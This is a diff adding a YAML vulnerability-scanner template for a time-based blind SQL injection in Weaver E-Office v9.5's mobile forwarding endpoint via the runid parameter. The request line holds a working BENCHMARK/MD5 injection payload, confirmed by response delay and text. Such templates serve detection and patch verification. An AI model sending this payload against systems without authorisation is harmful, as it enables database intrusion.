@@ -1,0 +1,12 @@
+name: 泛微-EOffice-v9.5-runid-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /E-mobile/flow/forwardsucess.php?runid=1+AND+9926%3DBENCHMARK%283500000%2CMD5%280x7156734e%29%29&flowid=&flowprcs=&prcsid=&module=&scope=&page=&fromid=&detailid=&mobilesessionkey=&sessionkey=&diff=&contents=1&touserid=WV00000304
+    expression:
+      sleep: 4
+      body_all:
+        - "转发成功"
